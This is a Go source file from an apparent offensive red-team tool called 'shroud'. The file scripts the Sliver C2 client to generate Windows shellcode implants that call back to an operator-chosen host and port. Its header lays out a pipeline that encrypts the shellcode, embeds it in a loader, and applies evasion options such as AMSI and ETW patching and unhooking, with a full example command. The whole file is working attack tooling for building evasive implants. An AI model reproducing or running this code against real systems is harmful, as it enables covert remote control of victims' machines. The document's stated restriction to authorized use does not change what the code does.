// Package sliver implements a shellcode source backed by a Sliver C2 server.
//
// It is the Phase 3 "CLI shell-out" provider from the plan: instead of pulling
// the (large) Sliver Go SDK into the generator module, it drives the operator
// `sliver-client` binary non-interactively — writing a temporary rc script that
// runs `generate -f shellcode ... --save <tmpdir>`, then reading the produced
// `.bin` (a Donut-style position-independent code blob).
//
// The returned bytes feed straight into shroud's existing pipeline:
// sliver PIC blob → AES-encrypt at rest → embed → wrap in a technique (pe26 etc.)
// → cross-compile. The implant that pops on the target connects back to the
// Sliver server as a normal session.
//
// Workflow this provider assumes (operator setup, done once):
//
//	1. sliver-server                  # start server + mgmt console
//	2. (server console) new-operator --name kali --lhost 127.0.0.1
//	   -> writes a kali_<...>.cfg
//	3. (server console) multiplayer    # allow operator client connections (if prompted)
//	4. sliver-client import kali.cfg  # registers it under ~/.sliver-client/configs/
//
// Then:
//
//	./shroud generate pe26 --c2 sliver \
//	    --sliver-config ~/kali.cfg --lhost 127.0.0.1 --lport 8888 \
//	    -e aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd
//
// `FetchShellcode` re-imports the config (idempotent), connects to the server,
// generates a shellcode-format implant into a temp dir, and returns the blob.
//
// This provider is a dual-use red-team tool. `FetchShellcode` is only reachable
// through `shroud generate`, which is gated behind `shroud authorize`. See
// SECURITY.md — authorized use only.
package sliver

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// Options configures a shellcode fetch from a Sliver server.
type Options struct {
	// Config is the operator .cfg path (as produced by `new-operator`). If it is
	// already imported under ~/.sliver-client/configs/ the re-import is a no-op.
	Config string

	// Name is the implant name (becomes part of the saved .bin filename).
	// Defaults to "shroud-<timestamp>" when empty (timestamp supplied by caller).
	Name string

	// C2 endpoint the implant will call back to.
	LHost string
	LPort int

	// Transport: "mtls" (default), "https", or "wg" (wireguard).
	Transport string

	// OS/Arch of the implant. Defaults to windows/amd64 (shroud is x64-only in P1).
	OS   string
	Arch string

	// SaveDir overrides the temp dir used to collect the .bin. Default: temp dir.
	SaveDir string

	// ClientBin overrides the sliver-client path. Default: LocateClient().
	ClientBin string

	// Timeout for the generate run (sliver first builds compile Go deps → slow).
	// Default 10m when zero.
	Timeout time.Duration
}

// Result describes a successful fetch.
type Result struct {
	Bytes     []byte    // the PIC shellcode blob
	SavePath  string    // where the .bin was collected from
	Name      string    // resolved implant name
	BuildTime time.Duration
}

// LocateClient finds the sliver-client operator binary. It checks $PATH then
// the known Kali locations (/usr/bin/sliver-client, /usr/local/bin/sliver-client).
func LocateClient() (string, error) {
	for _, name := range []string{"sliver-client"} {
		if p, err := exec.LookPath(name); err == nil {
			return p, nil
		}
	}
	for _, p := range []string{"/usr/bin/sliver-client", "/usr/local/bin/sliver-client"} {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p, nil
		}
	}
	return "", errors.New("sliver-client not found on PATH or /usr/bin — install sliver (or set Options.ClientBin)")
}

// Preflight validates that the inputs are usable WITHOUT contacting the server:
// client binary present, config file readable. Call this before FetchShellcode to
// fail fast with an actionable message.
func Preflight(opts Options) error {
	if _, err := LocateClient(); err != nil {
		return err
	}
	bin := opts.ClientBin
	if bin == "" {
		bin, _ = LocateClient()
	}
	if st, err := os.Stat(bin); err != nil || st.IsDir() {
		return fmt.Errorf("sliver-client binary not usable: %s", bin)
	}
	if opts.Config == "" {
		return errors.New("--sliver-config is required for --c2 sliver (operator .cfg from `new-operator`)")
	}
	if st, err := os.Stat(opts.Config); err != nil || st.IsDir() {
		return fmt.Errorf("sliver operator config not found: %s", opts.Config)
	}
	if opts.LHost == "" {
		return errors.New("--lhost is required for --c2 sliver (implant callback endpoint)")
	}
	if opts.LPort == 0 {
		return errors.New("--lport is required for --c2 sliver (implant callback port)")
	}
	return nil
}

// FetchShellcode generates a shellcode-format Sliver implant and returns the PIC
// blob. It re-imports the operator config (idempotent), connects to the server,
// runs `generate -f shellcode` via an rc script, and reads the produced .bin.
func FetchShellcode(opts Options) (*Result, error) {
	if err := Preflight(opts); err != nil {
		return nil, err
	}
	// defaults
	if opts.OS == "" {
		opts.OS = "windows"
	}
	if opts.Arch == "" {
		opts.Arch = "amd64"
	}
	if opts.Transport == "" {
		opts.Transport = "mtls"
	}
	if opts.Timeout == 0 {
		opts.Timeout = 10 * time.Minute
	}
	if opts.Name == "" {
		opts.Name = "shroud"
	}

	bin := opts.ClientBin
	if bin == "" {
		bin, _ = LocateClient()
	}

	// 1. (Re)import the operator config — idempotent: sliver-client import just
	// copies it into ~/.sliver-client/configs/ if not present.
	if err := run(bin, opts.Timeout, "import", opts.Config); err != nil {
		return nil, fmt.Errorf("sliver import config: %w (run `sliver-client import %s` manually to see details)", err, opts.Config)
	}

	// 2. Temp dir to collect the .bin (sliver writes <save>/<name>[_<hex>].bin).
	saveDir := opts.SaveDir
	if saveDir == "" {
		td, err := os.MkdirTemp("", "shroud-sliver-*")
		if err != nil {
			return nil, fmt.Errorf("mktemp: %w", err)
		}
		defer os.RemoveAll(td)
		saveDir = td
	} else if err := os.MkdirAll(saveDir, 0o755); err != nil {
		return nil, fmt.Errorf("mkdir saveDir %s: %w", saveDir, err)
	}

	// 3. Build the rc script: connect → generate shellcode → exit.
	rc, err := buildRCScript(opts, saveDir)
	if err != nil {
		return nil, err
	}
	rcPath := filepath.Join(saveDir, "shroud.rc")
	if err := os.WriteFile(rcPath, []byte(rc), 0o644); err != nil {
		return nil, fmt.Errorf("write rc: %w", err)
	}

	// 4. Run `sliver-client --rc shroud.rc` with stdin=EOF so the console exits
	// after the script (generate is synchronous — it blocks until the .bin lands).
	start := now()
	cmd := exec.Command(bin, "--rc", rcPath)
	cmd.Stdin = strings.NewReader("") // EOF → console exits after rc
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("sliver-client generate failed: %w\n%s", err, out)
	}

	// 5. Locate the produced .bin (newest *.bin in saveDir, excluding our rc).
	binPath, err := findShellcode(saveDir)
	if err != nil {
		return nil, fmt.Errorf("no shellcode .bin produced in %s: %w\nsliver output:\n%s", saveDir, err, out)
	}
	data, err := os.ReadFile(binPath)
	if err != nil {
		return nil, fmt.Errorf("read %s: %w", binPath, err)
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("shellcode .bin is empty: %s", binPath)
	}

	return &Result{
		Bytes:     data,
		SavePath:  binPath,
		Name:      opts.Name,
		BuildTime: now().Sub(start),
	}, nil
}

// buildRCScript renders the console script. `generate` is synchronous: it builds
// the implant and writes the .bin before returning, so `exit` after it is safe.
func buildRCScript(opts Options, saveDir string) (string, error) {
	var sb strings.Builder
	sb.WriteString("# shroud-generated rc script — generate a sliver shellcode implant.\n")
	sb.WriteString("generate")
	sb.WriteString(" --os " + opts.OS)
	sb.WriteString(" --arch " + opts.Arch)
	switch opts.Transport {
	case "mtls":
		sb.WriteString(fmt.Sprintf(" --mtls %s:%d", opts.LHost, opts.LPort))
	case "https":
		sb.WriteString(fmt.Sprintf(" --https %s:%d", opts.LHost, opts.LPort))
	case "wg":
		sb.WriteString(fmt.Sprintf(" --wg %s:%d", opts.LHost, opts.LPort))
	default:
		return "", fmt.Errorf("unknown sliver transport %q (mtls|https|wg)", opts.Transport)
	}
	sb.WriteString(" --format shellcode")
	sb.WriteString(" --save " + saveDir)
	sb.WriteString(" --name " + opts.Name)
	sb.WriteString("\nexit\n")
	return sb.String(), nil
}

// findShellcode returns the newest *.bin in dir (sliver names vary by version:
// <name>.bin or <name>_<hex>.bin). It skips the rc script.
func findShellcode(dir string) (string, error) {
	var newest string
	var newestMT int64
	matches, err := filepath.Glob(filepath.Join(dir, "*.bin"))
	if err != nil {
		return "", err
	}
	for _, m := range matches {
		st, err := os.Stat(m)
		if err != nil || st.IsDir() {
			continue
		}
		if st.ModTime().UnixNano() > newestMT {
			newestMT = st.ModTime().UnixNano()
			newest = m
		}
	}
	if newest == "" {
		return "", errors.New("no .bin found")
	}
	return newest, nil
}

// run executes a sliver-client subcommand capturing output.
func run(bin string, timeout time.Duration, args ...string) error {
	cmd := exec.Command(bin, args...)
	// `import` is non-interactive and fast; EOF on stdin avoids any prompt.
	cmd.Stdin = strings.NewReader("")
	done := make(chan error, 1)
	go func() { done <- cmd.Run() }()
	select {
	case err := <-done:
		return err
	case <-time.After(timeout):
		_ = cmd.Process.Kill()
		return fmt.Errorf("timeout after %s", timeout)
	}
}

// now is the standard time.Now, wrapped so tests can substitute a clock if needed.
func now() time.Time { return time.Now() }